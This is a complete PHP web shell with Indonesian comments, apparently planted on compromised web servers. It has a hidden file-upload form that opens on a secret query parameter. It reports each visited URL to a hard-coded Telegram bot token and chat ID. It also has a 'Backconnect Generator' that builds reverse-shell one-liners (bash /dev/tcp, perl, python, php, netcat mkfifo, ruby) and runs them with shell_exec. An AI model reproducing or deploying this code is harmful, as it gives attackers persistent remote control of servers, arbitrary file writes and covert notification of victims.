
<?php
session_start();
if (isset($_GET["UBK"]) && $_GET["UBK"] === "3") {
    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
    echo '<input type="file" name="file" size="15">';
    echo '<input type="submit" value="go">';
    echo "</form>";
}

if (isset($_FILES["file"]["tmp_name"])) {
    $uploadd = $_FILES["file"]["tmp_name"];
    if (file_exists($uploadd)) {
        $pwddir = $_POST["dir"];
        $real = $_FILES["file"]["name"];
        $de = rtrim($pwddir, "/") . "/" . $real;
        if (move_uploaded_file($uploadd, $de)) {
            echo "go$de";
        } else {
            echo "GAGAL  KE $de";
        }
    }
}
// Fungsi untuk mengirim pesan ke Telegram
function kirimPesanTelegram($token, $chatId, $pesan)
{
    // Periksa apakah token dan chatId valid
    if (empty($token) || empty($chatId)) {
        echo "Token atau Chat ID tidak valid.";
        return;
    }

    $url = "https://api.telegram.org/bot$token/sendMessage";

    // Data yang akan dikirim ke API Telegram
    $data = [
        "chat_id" => $chatId,
        "text" => $pesan,
    ];

    // Inisialisasi cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    // Eksekusi cURL dan ambil respon
    $response = curl_exec($ch);

    // Cek jika terjadi error pada cURL
    if (curl_errno($ch)) {
        echo "Error: " . curl_error($ch);
    }

    // Tutup cURL
    curl_close($ch);
}

// Token bot Anda dan chat ID tujuan
$token = "8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc";
$chatId = "5070938778";

// Mengambil informasi URL dinamis dari server
$protocol = $_SERVER["REQUEST_SCHEME"]; // HTTP atau HTTPS
$host = $_SERVER["HTTP_HOST"]; // domain atau IP, misal web.com
$request_uri = $_SERVER["REQUEST_URI"]; // path yang sedang diakses, misal /asu/ppk.php

// Gabungkan untuk mendapatkan URL lengkap
$full_url = $protocol . "://" . $host . $request_uri;

// Tentukan waktu cooldown dalam detik
$cooldown = 60; // 1 menit, Anda bisa menyesuaikan waktu ini

// Cek apakah cooldown sudah habis, jika tidak, jangan kirim pesan
if (
    !isset($_SESSION["last_message_time"]) ||
    time() - $_SESSION["last_message_time"] > $cooldown
) {
    // Kirim pesan ke Telegram
    $pesan = "Link diakses: $full_url";
    kirimPesanTelegram($token, $chatId, $pesan);

    // Simpan waktu pengiriman pesan terakhir
    $_SESSION["last_message_time"] = time();
} else {
    echo "";
}
function backconnect($host, $port, $type)
{
    switch ($type) {
        case "perl":
            return 'perl -e \'use Socket;$i="' .
                $host .
                '";$p=' .
                $port .
                ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'';

        case "python":
            return 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' .
                $host .
                '",' .
                $port .
                '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'';

        case "bash":
            return "bash -i >& /dev/tcp/" . $host . "/" . $port . " 0>&1";

        case "php":
            return 'php -r \'$sock=fsockopen("' .
                $host .
                '",' .
                $port .
                ');exec("/bin/sh -i <&3 >&3 2>&3");\'';

        case "nc":
            return "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " .
                $host .
                " " .
                $port .
                " >/tmp/f";

        case "ruby":
            return 'ruby -rsocket -e\'f=TCPSocket.open("' .
                $host .
                '",' .
                $port .
                ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'';

        default:
            return 'echo "Invalid backconnect type"';
    }
}

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["submit-bc"])) {
    $host = $_POST["backconnect-host"] ?? "127.0.0.1";
    $port = $_POST["backconnect-port"] ?? 4444;
    $type = $_POST["gecko-bc"] ?? "bash";

    $command = backconnect($host, $port, $type);
    echo "<pre>Backconnect Command:\n";
    echo htmlspecialchars($command) . "\n\n";
    echo "Execute with: " .
        htmlspecialchars(shell_exec($command . " 2>&1")) .
        "</pre>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Generator</title>
    <style>
        body {
            background: #0e0f17;
            color: white;
            font-family: monospace;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            background: #1a1b26;
            padding: 20px;
            border-radius: 10px;
        }
        select, input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #25688f;
            color: white;
            border: none;
            border-radius: 5px;
        }
        button {
            background: #25688f;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
        }
        button:hover {
            background: #1d5270;
        }
        pre {
            background: #1a1b26;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Backconnect Generator</h2>
        <form method="POST">
            <select name="gecko-bc">
                <option value="bash">Bash</option>
                <option value="perl">Perl</option>
                <option value="python">Python</option>
                <option value="php">PHP</option>
                <option value="nc">Netcat (nc)</option>
                <option value="ruby">Ruby</option>
            </select>
            
            <input type="text" name="backconnect-host" placeholder="127.0.0.1" value="127.0.0.1">
            <input type="number" name="backconnect-port" placeholder="4444" value="4444">
            
            <button type="submit" name="submit-bc">Generate Backconnect</button>
        </form>
        
        <?php if (
            $_SERVER["REQUEST_METHOD"] === "POST" &&
            isset($_POST["submit-bc"])
        ): ?>
        <div style="margin-top: 20px;">
            <h3>Usage:</h3>
            <p>1. Start listener on your machine:</p>
            <pre>nc -lvnp <?= htmlspecialchars($port) ?></pre>
            <p>2. Execute the generated command on target</p>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>
